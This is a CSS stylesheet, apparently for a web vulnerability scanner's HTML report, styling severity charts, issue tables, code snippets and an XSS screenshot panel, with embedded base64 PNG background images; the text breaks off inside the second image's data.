          .datatable .double td,.datatable div.double {
          border-bottom: 2px solid #3D92AC;
          }

          .datatable .filteredheader th:last-child {
          width: 20%;
          }

          .datatable .commentsheader th:first-child {
          width: 40%;
          }

          .datatable .cookiesheader th:last-child {
          width: 150px;
          }

          td,.td {
          word-wrap: break-word;
          word-break: break-all;
          }

          td.breakNormal {
          word-break: break-all;
          }

          img {
          page-break-inside: avoid;
          }

          .datatable a {
          color: #3D92AC;
          text-decoration: none;
          }

          .datatable a:hover {
          text-decoration: underline;
          }

          .datatable .severity {
          width: 24px;
          text-align: center;
          color: white;
          border-radius: 0px;
          -moz-border-radius: 0px;
          }

          .headerdatatable th {
          background: none;
          color: #333;
          padding: 4px 8px;
          }

          .headerdatatable td {
          padding: 4px 8px;
          }

          .toclink {
          text-align: right;
          float: right;
          font-weight: normal;
          font-size: 8pt;
          color: #3D92AC;
          padding-top: 4px;
          }

          .issueType .toclink {
          color: #FFFFFF;
          float: none;
          }

          .count {
          background-color: #6EADC1;
          border-radius: 2em;
          -moz-border-radius: 2em;
          color: #ffffff;
          padding: 1px 4px;
          margin: 0 4px;
          font-size: 60%;
          font-weight: bold;
          /* vertical-align: 15%; */
          }

          .issueType .count {
          background-color: #D8E9EE;
          color: #3D92AC;
          margin: 0;
          }

          .highlight {
          background-color: yellow;
          }

          .mark {
          color: red;
          }

          .chartContainer {
          page-break-inside: avoid;
          }

          .chart {
          position: relative;
          height: 400px;
          font-size: 18px;
          color: #333;
          overflow: hidden;
          }

          .chart .legendContainer {
          left: 50%;
          top: 8%;
          position: absolute;
          overflow: visible;
          }

          .chart .legend {
          margin-left: -50%;
          }

          .chart .legend .icon {
          display: table-cell;
          width: 22px;
          box-shadow: 1px -1px 2px 1px #999;
          }

          .chart .legend .label {
          display: table-cell;
          padding: 0 32px 0 8px;
          }

          .chart .stick {
          position: absolute;
          height: 64%;
          width: 25%;
          bottom: 0%;
          z-index: 10;
          overflow: hidden;
          }

          .chart .stick .label {
          text-align: center;
          padding-top: 8px;
          color: #FFF;
          text-shadow: #999999 0px -1px 0px;
          }

          .chart .stick .labelInfo {
          font-size: 11px;
          padding-top: 0px;
          }

          .chart .stick.severity_6 {
          box-shadow: 1px -1px 2px 1px #999, inset 0px 50px 50px 0px #C10C0D;
          left: 0%;
          height: 40%;
          width: 20%;
          }

          .chart .stick.severity_3 {
          box-shadow: 1px -1px 2px 1px #999, inset 0px 50px 50px 0px #F95454;
          left: 20%;
          height: 40%;
          width: 20%;
          }

          .chart .stick.severity_2 {
          box-shadow: 1px -1px 2px 1px #999, inset 0px 50px 50px 0px #FF8A00;
          left: 40%;
          height: 30%;
          width: 20%;
          }

          .chart .stick.severity_1 {
          box-shadow: 1px -1px 2px 1px #999, inset 0px 50px 50px 0px #FFC919;
          left: 60%;
          height: 50%;
          width: 20%;
          }

          .chart .stick.severity_0 {
          box-shadow: 1px -1px 2px 1px #999, inset 0px 50px 50px 0px #93A2AD;
          left: 80%;
          height: 20%;
          width: 20%;
          }

          .chart .stick.stick_2 {
          box-shadow: 1px -1px 2px 1px #999, inset 0px 50px 50px 0px #DA8F44;
          left: 0%;
          height: 20%;
          }

          .chart .stick.stick_1 {
          box-shadow: 1px -1px 2px 1px #999, inset 0px 50px 50px 0px #43B443;
          left: 38%;
          height: 80%;
          }

          .chart .stick.stick_0 {
          box-shadow: 1px -1px 2px 1px #999, inset 0px 50px 50px 0px #B1893B;
          left: 75%;
          height: 40%;
          }

          .chart .line {
          border-bottom: 1px solid #aaa;
          position: absolute;
          bottom: 24%;
          width: 90%;
          left: 5%;
          right: 5%;
          overflow: visible;
          }

          .chart .line .label {
          position: relative;
          left: -5%;
          top: 12px;
          }

          .chart .series1 {
          position: absolute;
          width: 38%;
          left: 9%;
          bottom: 16%;
          height: 64%;
          }

          .chart .series2 {
          position: absolute;
          width: 38%;
          left: 53%;
          bottom: 16%;
          height: 64%;
          }

          .chart .series3 {
          position: absolute;
          width: 82%;
          left: 9%;
          bottom: 16%;
          height: 64%;
          }

          .chart .seriesLabel1 {
          position: absolute;
          height: 5%;
          width: 50%;
          left: 2%;
          bottom: 0%;
          text-align: center;
          }

          .chart .seriesLabel2 {
          position: absolute;
          height: 5%;
          width: 50%;
          left: 48%;
          bottom: 0%;
          text-align: center;
          }

          .chart .seriesLabel3 {
          position: absolute;
          height: 5%;
          width: 96%;
          left: 2%;
          bottom: 0%;
          text-align: center;
          }

          .chart .countersContainer1 {
          bottom: 8%;
          width: 100%;
          position: absolute;
          overflow: visible;
          }

          .chart .countersContainer1 .counters {
          width: 92%;
          padding: 0 0 0 4%;
          }

          .chart .countersContainer1 .counters .counter {
          width: 33%;
          display: table-cell;
          text-align: center;
          }

          .chart .countersContainer2 {
          bottom: 8%;
          width: 50%;
          position: absolute;
          overflow: visible;
          }

          .chart .countersContainer2 .counters {
          width: 76%;
          }

          .chart .countersContainer2 .counters .counter {
          width: 20%;
          display: table-cell;
          text-align: center;
          }

          .stick_0 {
          background-color: #754F00;
          }

          .stick_1 {
          background-color: #009900;
          }

          .stick_2 {
          background-color: #E67300;
          }

          /* Issue Information */
          .doubleScreen {
          position: relative;
          }

          .doubleScreen .right {
          width: 47%;
          float: right;
          position: relative;
          height: 24px;
          }

          .doubleScreen .left {
          width: 47%;
          float: left;
          position: relative;
          height: 24px;
          }

          .doubleScreen .single {
          position: relative;
          height: 24px;
          }

          .doubleScreen .rightCode {
          width: 46%;
          float: right;
          overflow: auto;
          border-top: 1px solid #999999;
          border-bottom: 1px solid #ffffff;
          border-right: 1px solid #ffffff;
          border-left: 1px solid #999999;
          background-color: #eeeeee;
          margin-bottom: 10px;
          height: 250px;
          padding: 1.1%;
          }

          .doubleScreen .leftCode {
          width: 46%;
          float: left;
          overflow: auto;
          border-top: 1px solid #999999;
          border-bottom: 1px solid #ffffff;
          border-right: 1px solid #ffffff;
          border-left: 1px solid #999999;
          background-color: #eeeeee;
          margin-bottom: 10px;
          height: 250px;
          padding: 1.1%;
          }

          .doubleScreen .rightHeader {
          width: 46%;
          float: right;
          overflow: auto;
          overflow-y: hidden;
          border-top: 1px solid #999999;
          border-bottom: 1px solid #ffffff;
          border-right: 1px solid #ffffff;
          border-left: 1px solid #999999;
          background-color: #ffffff;
          margin-bottom: 10px;
          padding: 1.1%;
          }

          .doubleScreen .leftHeader {
          width: 46%;
          float: left;
          overflow: auto;
          overflow-y: hidden;
          border-top: 1px solid #999999;
          border-bottom: 1px solid #ffffff;
          border-right: 1px solid #ffffff;
          border-left: 1px solid #999999;
          background-color: #ffffff;
          margin-bottom: 16px;
          padding: 1.1%;
          }

          .doubleScreen .rightHeader3 {
          width: 45%;
          float: right;
          overflow: auto;
          overflow-y: hidden;
          border-top: 1px solid #999999;
          border-bottom: 1px solid #ffffff;
          border-right: 1px solid #ffffff;
          border-left: 1px solid #999999;
          background-color: #ffffff;
          margin-bottom: 10px;
          padding: 1.1%;
          }

          .doubleScreen .leftHeader3 {
          width: 45%;
          float: left;
          overflow: auto;
          overflow-y: hidden;
          border-top: 1px solid #999999;
          border-bottom: 1px solid #ffffff;
          border-right: 1px solid #ffffff;
          border-left: 1px solid #999999;
          background-color: #ffffff;
          margin-bottom: 10px;
          padding: 1.1%;
          }

          .doubleScreen .singleHeader {
          overflow: auto;
          overflow-y: hidden;
          border-top: 1px solid #999999;
          border-bottom: 1px solid #ffffff;
          border-right: 1px solid #ffffff;
          border-left: 1px solid #999999;
          background-color: #ffffff;
          padding: 1.1%;
          padding-bottom: 2.5%;
          }

          .doubleScreen .rightImage {
          width: 48%;
          height: 36%;
          overflow: hidden;
          float: right;
          position: relative;
          border-top: 1px solid #666666;
          border-bottom: 1px solid #cccccc;
          border-left: 1px solid #666666;
          border-right: 1px solid #cccccc;
          margin-bottom: 10px;
          }

          .doubleScreen .leftImage {
          width: 48%;
          height: 36%;
          overflow: hidden;
          float: left;
          border-top: 1px solid #666666;
          border-bottom: 1px solid #cccccc;
          border-left: 1px solid #666666;
          border-right: 1px solid #cccccc;
          position: relative;
          margin-bottom: 10px;
          }

          .doubleScreen .rightImage3 {
          width: 47%;
          height: 36%;
          overflow: hidden;
          float: right;
          position: relative;
          border-top: 1px solid #666666;
          border-bottom: 1px solid #cccccc;
          border-left: 1px solid #666666;
          border-right: 1px solid #cccccc;
          margin-bottom: 10px;
          }

          .doubleScreen .leftImage3 {
          width: 47%;
          height: 36%;
          overflow: hidden;
          float: left;
          border-top: 1px solid #666666;
          border-bottom: 1px solid #cccccc;
          border-left: 1px solid #666666;
          border-right: 1px solid #cccccc;
          position: relative;
          margin-bottom: 10px;
          }

          .doubleScreen .centerImage3 {
          position: absolute;
          left: 0px;
          right: 0px;
          line-height: 210px;
          text-align: center;
          font-size: 50px;
          font-weight: bold;
          color: #333333;
          }

          .doubleScreen .singleImage {
          border-top: 1px solid #666666;
          border-bottom: 1px solid #cccccc;
          border-left: 1px solid #666666;
          border-right: 1px solid #cccccc;
          margin-top: 10px;
          clear: both;
          overflow: visible;
          background-color: #FFFFFF;
          min-height: 350px;
          }

          .doubleScreen .singleImage .xssContainer {
          position: absolute;
          width: 200px;
          left: 50%;
          top: 100px;
          }

          .doubleScreen .singleImage .xssBlurb {
          /* background:url(alert_middle.png) repeat-y; */
          background:
          url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAMgAAAA8CAYAAAAjW/WRAAAABHNCSVQICAgIfAhkiAAAAAlwSFlzAAALEgAACxIB0t1+/AAAABZ0RVh0Q3JlYXRpb24gVGltZQAwOS8xNS8wOI8g8wMAAAQRdEVYdFhNTDpjb20uYWRvYmUueG1wADw/eHBhY2tldCBiZWdpbj0iICAgIiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+Cjx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDQuMS1jMDM0IDQ2LjI3Mjk3NiwgU2F0IEphbiAyNyAyMDA3IDIyOjM3OjM3ICAgICAgICAiPgogICA8cmRmOlJERiB4bWxuczpyZGY9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkvMDIvMjItcmRmLXN5bnRheC1ucyMiPgogICAgICA8cmRmOkRlc2NyaXB0aW9uIHJkZjphYm91dD0iIgogICAgICAgICAgICB4bWxuczp4YXA9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC8iPgogICAgICAgICA8eGFwOkNyZWF0b3JUb29sPkFkb2JlIEZpcmV3b3JrcyBDUzM8L3hhcDpDcmVhdG9yVG9vbD4KICAgICAgICAgPHhhcDpDcmVhdGVEYXRlPjIwMDgtMDktMTVUMTI6MzU6MjBaPC94YXA6Q3JlYXRlRGF0ZT4KICAgICAgICAgPHhhcDpNb2RpZnlEYXRlPjIwMDgtMDktMTVUMTU6Mjk6NThaPC94YXA6TW9kaWZ5RGF0ZT4KICAgICAgPC9yZGY6RGVzY3JpcHRpb24+CiAgICAgIDxyZGY6RGVzY3JpcHRpb24gcmRmOmFib3V0PSIiCiAgICAgICAgICAgIHhtbG5zOmRjPSJodHRwOi8vcHVybC5vcmcvZGMvZWxlbWVudHMvMS4xLyI+CiAgICAgICAgIDxkYzpmb3JtYXQ+aW1hZ2UvcG5nPC9kYzpmb3JtYXQ+CiAgICAgIDwvcmRmOkRlc2NyaXB0aW9uPgogICA8L3JkZjpSREY+CjwveDp4bXBtZXRhPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIOHvbA0AAAAYdEVYdFNvZnR3YXJlAEFkb2JlIEZpcmV3b3Jrc0+zH04AABDvSURBVHic7Z15kBPnlcBfd6tbLbW61a0LZobBgw9gwdgGc5tg7DGH7YTYSypbSW1VYieA16m9a7Oudap2tnazlWwq2aviBNuxk62tpLJbXjtsDAZzGIxhwF5zORiwMXhgLkmtvnV0q6X9o/vTSGJmADMzmqN/VWL4B6k/1fx433v9vtfYJ3fi5Vl/vw2guQ0g3gLAxwAYFoD0A2AYeHhMesplAKsAYGgAchog1Q3Qcwk++c4WwAHKAHYRoFgEKFrO320boFxy/mG53OjL9/AYHdDvd7nk/M7brgPFIoBdBAwD8GEAAJYJUMgNvCg/AEEA4AQAjgMA7ryhF1E8JgPoP/1yCaBUAijZTgSpdsAyAQMAH44BgJkHyOkAhgpAUgAY7rwJ6QfwkQA+HwC4cniSeExkKrui8sCuCW2vdMVxIKcDmHlHEAwArO5LQPoDAITPeZNSyQk3AQaAop2I4iO9aOIxcamPGkULwCy4wcFw5FAzTg6iyWB2XQAcAyCenT99q3y8k7XEJPhj0wAnCDcPKTpvVJ2HICmwyh+eKB7jmxox3DzDLADkswBZHUCTARTREUNOg919EaQ3XwXl7V0QjER7ie9H9R+S0biUk6Xlmbd3BcAyy3S8aSBhL9nOa7CE3RPFY7wymBiWCZDPOVsoXQHQJEcMKQUgpSCz49eQfvU/MLyQlwQ2+Awn930ZK9878J5GvPW7sqT8lY3hJP/gF0rc8gfLwPIAobDzCoYA6GDdtstN5DFv6+UxDhgsAa/eTqHIoSuuJDKonfswed92nCiXLV4I/4BJXX4W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)
          repeat-y;
          padding-left: 10px;
          padding-right: 10px;
          color: #990000;
          }

          .doubleScreen .singleImage .xssValue {
          position: absolute;
          left: 80px;
          top: 47px;
          color: #000000;
          font-size: 11px;
          }

          .doubleScreen .singleImage .xssImage {
          left: -175px;
          top: -75px;
          position: relative;
          }

          .doubleScreen .singleImage .xssImage {
          left: -175px;
          top: -75px;
          position: relative;
          }

          .doubleScreen .image {
          width: 100%;
          }

          .doubleScreen .title {
          float: left;
          color: #666666;
          font-size: 18px;
          font-weight: bold;
          position: absolute;
          left: 0px;
          top: 0px;
          z-index: 2;
          }

          .doubleScreen .titleHighlight {
          font-size: 18px;
          font-weight: bold;
          color: White;
          position: absolute;
          left: 1px;
          top: 1px;
          z-index: 1;
          }

          .logos {
          display: table;
          width: 100%;
          margin-bottom: 1.5em;
          }

          .logos .cell {
          display: table-cell;
          vertical-align: middle;
          }

          .logos .right {
          text-align: right;
          }

          .logos img{
          width: 96px;
          }
          .snippet {
          padding: 0.5em;
          background-color:white;
          }
          .snippet .lineNumber {
          color:#888888;
          width:2.2em;
          padding-right:0.7em;
          text-align:right;
          vertical-align:top;
          border-right:3px solid #aaaaaa;
          }
          .snippet .lineNumberHighlight {
          background-color:#aaaaaa;
          color:White;
          width:2.2em;
          padding-right:0.7em;
          text-align:right;
          vertical-align:top;
          border-right:3px solid #aaaaaa;
          }
          .snippet .taintCount {
          vertical-align:middle;
          padding-left: 0.5em;
          }
          .snippet .taintCount .bullet {
          -moz-border-radius: 8px;
          -webkit-border-radius:8px;
          background-color:#0099CC;
          padding: 0 0.4em;
          color:#ffffff;
          font-size: 0.7em;
          font-weight:bold;
          text-align:center;
          }
          .snippet .code {
          overflow:hidden;
          border-top:1px solid #DDDDDD;
          color: #333333;
          }
          .snippet .fileName {
          font-weight:bold;
          padding-left: 1em;
          padding-right: 1em;
          overflow: hidden;
          text-overflow: ellipsis;
          }

          .snippet table {
          border-collapse: collapse;
          }

          .snippet .nonhighlight {
          white-space: pre-wrap;
          padding-left: 1em;
          }

          .snippet .highlight {
          background-color:#FFFF00;
          font-weight:bold;
          }

          .snippet .comment {
          color: Green;
          }

          .snippet .keyword {
          color: DarkBlue;
          font-weight:bold;
          }
          .noPageBreak {
          page-break-inside: avoid;
          }
          .issueInformationComment {
          color: #666;
          height: 32px;
          padding: 8px 36px 0;
          background-repeat: no-repeat;
          background-image: url(data:image/png;base64,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